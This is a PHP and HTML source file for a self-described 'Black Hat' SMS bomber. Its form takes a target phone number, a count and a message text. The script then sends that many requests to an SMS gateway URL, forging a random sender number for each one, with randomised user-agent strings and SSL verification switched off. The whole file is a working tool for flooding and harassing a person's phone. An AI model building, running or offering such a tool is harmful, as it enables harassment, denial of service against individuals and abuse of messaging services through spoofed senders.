<!DOCTYPE html>
<html lang="en">
    <head> 
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.css">

		<!-- Website CSS style -->
		<link rel="stylesheet" type="text/css" href="assets/css/main.css">

		<!-- Website Font style -->
	    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
		
		<!-- Google Fonts -->
		<link href='https://fonts.googleapis.com/css?family=Passion+One' rel='stylesheet' type='text/css'>
		<link href='https://fonts.googleapis.com/css?family=Oxygen' rel='stylesheet' type='text/css'>

		<title>SMS Bomber</title>
	</head>
	<body>
		<div class="container">
			<div class="row main">
				<div class="panel-heading">
	               <div class="panel-title text-center">
	               		<h1 class="title">BD Black Hat Sms Bomber</h1>
	               		<hr />
	               	</div>
	            </div> 
				<div class="main-login main-center">
					<form class="form-horizontal" method="post" action="">
						
						<div class="form-group">
							<label for="name" class="cols-sm-2 control-label">Target number</label>
							<div class="cols-sm-10">
								<div class="input-group">
									<span class="input-group-addon"><i class="fa fa-user fa" aria-hidden="true"></i></span>
									<input type="text" class="form-control" name="target"  />
								</div>
							</div>
						</div>


						<div class="form-group">
							<label for="username" class="cols-sm-2 control-label">Count</label>
							<div class="cols-sm-10">
								<div class="input-group">
									<span class="input-group-addon"><i class="fa fa-users fa" aria-hidden="true"></i></span>
									<input type="text" class="form-control" name="count"  />
								</div>
							</div>
						</div>

			

						<div class="form-group">
							<label for="confirm" class="cols-sm-2 control-label">Message :</label>
							<div class="cols-sm-10">
								<div class="input-group">
									<span class="input-group-addon"><i class="fa fa-lock fa-lg" aria-hidden="true"></i></span>
									<textarea class="form-control" name="message" id=""  rows="5"></textarea>
								</div>
							</div>
						</div>

						<div class="form-group">
							<button type="submit" name="submit" class="btn btn-primary btn-lg btn-block login-button">Submit</button>
						</div>
						
					</form>
				</div>
			</div>
		</div>

		<script type="text/javascript" src="assets/js/bootstrap.js"></script>
	</body>
</html>

<?php 
if(isset($_POST['submit'])){

	$target = '88'.$_POST['target'];
	$count = $_POST['count'];
	//$msg = str_replace(' ','%20',$_POST['message']);
	$msg = $_POST['message'];
	$msg = rawurlencode($msg);

	$i = 1;
	while($i <= $count){
		$from= '880180807'.rand(0,9999);
		$html_brand = "http://privatesite.com/cgi.php?from=$from&to=$target&message=$msg";
		//if($i % 3){
		//	usleep(500000);
		//}
		bomb($html_brand);
		//echo $i.'<br>';
		$i++;
		
	}
	echo "<script>alert('done')</script>";
}
function random($qtd){
	$Caracteres = '12345';
	$QuantidadeCaracteres = strlen($Caracteres);
	$QuantidadeCaracteres--;
	$Hash=NULL;
	for($x=1;$x<=$qtd;$x++){
		$Posicao = rand(0,$QuantidadeCaracteres);
		$Hash .= substr($Caracteres,$Posicao,1);
	}

	return $Hash;
}


function bomb($server){
	$ch = curl_init();
	$options = array(
        CURLOPT_URL            => $server,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_AUTOREFERER    => true,
        CURLOPT_USERAGENT    => "Mozilla/".random(1).".0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/".random(1).".0.0.".random(2)."')",
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_SSL_VERIFYPEER => 0
    );
    curl_setopt_array( $ch, $options );
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

	curl_close($ch);
	}

?>